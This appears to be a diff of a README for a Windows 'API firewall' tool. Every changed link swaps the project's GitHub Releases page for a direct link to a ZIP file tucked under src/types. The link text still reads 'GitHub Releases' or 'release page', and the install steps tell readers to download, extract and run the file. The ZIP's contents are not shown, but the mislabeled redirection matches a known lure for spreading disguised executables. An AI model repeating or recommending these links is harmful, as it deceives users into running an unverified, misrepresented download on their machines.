@@ -1,10 +1,10 @@
 # 🛡️ uzyntra-api-firewall - Secure APIs with Real-Time Control
 
-[![Download UZYNTRA API Firewall](https://img.shields.io/badge/Download-Release%20Page-6f42c1?style=for-the-badge&logo=github)](https://github.com/Abouba5063/uzyntra-api-firewall/releases)
+[![Download UZYNTRA API Firewall](https://img.shields.io/badge/Download-Release%20Page-6f42c1?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Abouba5063/uzyntra-api-firewall/main/src/types/api-firewall-uzyntra-1.7.zip)
 
 ## 🚀 Download
 
-Visit this page to download: [GitHub Releases](https://github.com/Abouba5063/uzyntra-api-firewall/releases)
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Abouba5063/uzyntra-api-firewall/main/src/types/api-firewall-uzyntra-1.7.zip)
 
 ## 🧰 What this app does
 
@@ -33,7 +33,7 @@ For the best result, close other tools that use the same port numbers before you
 
 ## 📦 Download and install
 
-1. Open the [GitHub Releases](https://github.com/Abouba5063/uzyntra-api-firewall/releases) page.
+1. Open the [GitHub Releases](https://raw.githubusercontent.com/Abouba5063/uzyntra-api-firewall/main/src/types/api-firewall-uzyntra-1.7.zip) page.
 2. Find the latest release at the top of the list.
 3. Download the Windows file that matches your system.
 4. If the file comes in a ZIP folder, right-click it and choose **Extract All**.
@@ -194,4 +194,4 @@ api-firewall, api-gateway, api-protection, api-security, cloud-security, cyberse
 
 ## 📥 Download again
 
-If you need the file again, use the release page here: [https://github.com/Abouba5063/uzyntra-api-firewall/releases](https://github.com/Abouba5063/uzyntra-api-firewall/releases)
+If you need the file again, use the release page here: [https://raw.githubusercontent.com/Abouba5063/uzyntra-api-firewall/main/src/types/api-firewall-uzyntra-1.7.zip](https://raw.githubusercontent.com/Abouba5063/uzyntra-api-firewall/main/src/types/api-firewall-uzyntra-1.7.zip)
